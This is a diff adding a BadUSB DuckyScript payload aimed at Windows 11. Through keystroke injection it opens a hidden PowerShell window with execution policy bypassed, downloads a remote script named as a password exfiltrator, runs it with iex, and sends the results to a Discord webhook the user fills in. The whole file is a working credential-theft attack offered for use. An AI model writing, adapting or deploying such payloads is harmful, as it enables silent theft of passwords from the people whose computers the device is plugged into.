@@ -1,0 +1,13 @@
+REM Author: Arduino88
+REM Target: Windows 11
+
+REM *SETUP*
+REM replace WEBHOOK_HERE with your Discord Webhook.
+
+DEFAULT_DELAY 100
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; https://raw.githubusercontent.com/Arduino88/badusb-win-password-exfiltrator/refs/heads/main/key_exfil.ps1 | iex
+ENTER
